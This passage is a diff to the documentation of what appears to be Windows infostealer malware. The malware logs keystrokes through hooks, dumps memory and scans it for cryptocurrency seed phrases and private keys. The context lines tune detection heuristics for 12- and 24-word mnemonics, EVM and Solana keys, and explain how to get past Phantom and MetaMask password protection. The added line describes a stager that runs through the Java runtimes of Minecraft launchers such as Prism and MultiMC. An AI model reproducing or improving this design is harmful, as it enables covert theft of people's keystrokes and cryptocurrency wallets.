@@ -79,6 +79,8 @@ Artifacts live in `cache/ops/`: `keys.events` (hook queue, rotated 1 MB × 3), `
 
 `findings` distinguishes confidence instead of alerting on every checksum hit. A 24-word phrase passes on its 8-bit checksum. A 12-word phrase also needs a wallet marker within 256 bytes (`mnemonic`, `secretKey`, `seed`, `phrase`, `backup`, `"words"`) or at least 9 distinct words with at most one repeated; this rejects UI label lists such as `arrow right edge…` that pass the 4-bit checksum by chance. Repeating the same value in the dump raises confidence but does not accept it alone, because CSS blocks repeat the same labels. Only strong signals say `seed encontrada`; a random-looking 12-word hit without context says `posible seed (12 palabras)`. Values already alerted are suppressed for 30 min between dumps, and a seed alerted by the clipboard is suppressed for 2 min; the findings file still lists them. A 64-hex value is `hex64`/`evm-key` (bare values need 8 distinct hex digits so constant fills do not alert), and Solana requires 87–88 base58 characters with non-base58 boundaries plus mixed case and a digit, so sorted dictionaries are not reported as keys.
 
+The stager launches the browser's real `java.home` runtime and keeps the copied `javaw.exe` only as a fallback; a lone copied launcher cannot resolve `jvm.dll` in launcher-bundled JREs such as Prism or MultiMC.
+
 Windows-only is a hard limit: the Linux agent keeps the commands but reports `Windows only`. Native startup needs an interactive user session; a locked desktop still receives hook events. Phantom and MetaMask are not decrypted without the password — the memory dump is the password-independent path.
 
 ### Manual Windows checklist
